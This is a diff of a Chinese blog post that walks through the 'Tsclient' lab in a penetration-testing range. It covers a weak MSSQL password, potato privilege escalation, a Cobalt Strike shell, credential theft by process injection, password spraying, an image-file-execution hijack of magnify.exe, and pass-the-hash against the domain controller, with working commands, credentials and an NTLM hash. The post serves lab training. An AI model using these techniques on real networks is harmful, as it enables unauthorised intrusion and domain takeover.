@@ -8,12 +8,12 @@
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集先用fscan扫描一下看看有啥东西吗  数据库提权扫描出来一个弱口令，我们用mdut登录下看看能不能提权   发现可以执行xpcmd   但是是mssql权限，考虑用哥甜土豆提权一下看看能不能成功   发现可以提权成功。来反弹个shell，这里学习下cs工具的使用   上线成功，来读取一波flag   内网渗透收集下内网信息 12345678910111213141516171819202">
+    <meta name="description" content="信息收集 先用fscan扫描一下看看有啥东西吗  数据库提权 扫描出来一个弱口令，我们用mdut登录下看看能不能提权  发现可以执行xpcmd  但是是mssql权限，考虑用哥甜土豆提权一下看看能不能成功  发现可以提权成功。来反弹个shell，这里学习下cs工具的使用  上线成功，来读取一波flag  内网渗透 收集下内网信息 1234567891011121314151617181920212">
 <meta property="og:type" content="article">
 <meta property="og:title" content="春秋云镜-Tsclient">
 <meta property="og:url" content="https://oceanzbz.github.io/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/index.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="信息收集先用fscan扫描一下看看有啥东西吗  数据库提权扫描出来一个弱口令，我们用mdut登录下看看能不能提权   发现可以执行xpcmd   但是是mssql权限，考虑用哥甜土豆提权一下看看能不能成功   发现可以提权成功。来反弹个shell，这里学习下cs工具的使用   上线成功，来读取一波flag   内网渗透收集下内网信息 12345678910111213141516171819202">
+<meta property="og:description" content="信息收集 先用fscan扫描一下看看有啥东西吗  数据库提权 扫描出来一个弱口令，我们用mdut登录下看看能不能提权  发现可以执行xpcmd  但是是mssql权限，考虑用哥甜土豆提权一下看看能不能成功  发现可以提权成功。来反弹个shell，这里学习下cs工具的使用  上线成功，来读取一波flag  内网渗透 收集下内网信息 1234567891011121314151617181920212">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307185902774.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307190119315.png">
@@ -204,73 +204,56 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用fscan扫描一下看看有啥东西吗</p>
+    <h2 id="信息收集">信息收集</h2>
+<p>先用fscan扫描一下看看有啥东西吗</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307185902774.png" class="">
-<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>扫描出来一个弱口令，我们用mdut登录下看看能不能提权</p>
+<h2 id="数据库提权">数据库提权</h2>
+<p>扫描出来一个弱口令，我们用mdut登录下看看能不能提权</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307190119315.png" class="">
-
 <p>发现可以执行xpcmd</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307190202755.png" class="">
-
 <p>但是是mssql权限，考虑用哥甜土豆提权一下看看能不能成功</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307190527289.png" class="">
-
 <p>发现可以提权成功。来反弹个shell，这里学习下cs工具的使用</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307190726127.png" class="">
-
 <p>上线成功，来读取一波flag</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307191113711.png" class="">
-
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>收集下内网信息</p>
+<h2 id="内网渗透">内网渗透</h2>
+<p>收集下内网信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:30f1:35e1:d89c:71e5</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure>
-
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307191238337.png" class="">
-
 <p>发现有一个John用户，看看其在不在线。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure>
-
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307191345780.png" class="">
-
 <p>发现是在线的。注入一下其进程</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307192030915.png" class="">
-
 <p>发现存在一个网络连接，读取一下其中的内容。</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307192316223.png" class="">
-
 <p>得到了一个用户名和密码，并且提示了一个 映像劫持，先记下来后面要用。</p>
 <p>那我们拿着这个用户名和密码去遍历下看看谁能登录，先搭建个socks5代理方便后续渗透。</p>
-<p><code>crackmapexec smb 172.22.8.0/24 -u &#39;Aldrich&#39; -p &#39;Ald@rLMWuy7Z!#&#39;</code></p>
+<p><code>crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'</code></p>
 <p>但是都不行，考虑用kali的rdesktop(因为可以更改密码)远程登录试试一个个尝试，最后发现172.22.8.46可以登录，但是要改一下密码。这里其实也可以参考其他师傅的思路就是用impacket 工具包更改下密码就行</p>
-<p><code>python3 smbpasswd.py xiaorang.lab/Aldrich:&#39;Ald@rLMWuy7Z!#&#39;@172.22.8.15 -newpass &#39;password&#39;</code></p>
+<p><code>python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'password'</code></p>
 <p>之后换一个rdp工具kali有点ka也不知道为啥。</p>
-<h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307195246344.png" class="">
-
+<h2 id="映像劫持">映像劫持</h2>
+<img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307195246344.png" class="">
 <p>根据之前的提示有个映像劫持提权，咱们还是用cs学习他，因为这台机器不出网，但是在内网可以，所以就利用cs派生一个监听端口然后生成木马让其连接。</p>
 <p>先查看下权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure>
-
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307200844510.png" class="">
-
 <p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，使用放大镜进行提权，其实也就是把本来用户主页点放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
-
 <p>然后我们锁屏点击放大镜</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307201117575.png" class="">
-
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307201144831.png" class="">
-
 <p>提权成功，在从新运行下我们的马。</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307201517414.png" class="">
-
 <p>此时去获取第二个flag</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307201553386.png" class="">
-
 <p>接下来继续在收集信息</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307201735844.png" class="">
-
 <p>发现该机器账户在域管理员组里，那么我们就dump下hash</p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307201943209.png" class="">
-
 <p>然后打一下pth直接拿下第三个flag</p>
 <p><code>proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H ffcdf594beeada0076fc2263cd7947f7 -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</code></p>
 <img src="/2025/03/07/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/IMAGE20250307205435555.png" class="">
